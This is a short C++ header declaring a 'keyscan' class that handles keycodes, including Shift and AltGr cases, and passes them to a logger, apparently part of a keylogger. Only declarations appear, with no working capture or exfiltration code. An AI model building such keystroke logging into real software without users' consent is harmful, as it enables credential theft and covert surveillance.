#pragma once
#include "pch.h"
#include "log/log.h"

class keyscan {
private:
	logging* m_logger = nullptr;
	
	bool functional(const int& keycode);
	void mless(const int& keycode);
	void shift(const int& keycode);
	void altgr(const int& keycode);
	
public:
	keyscan(logging* logger);
	void scan();
};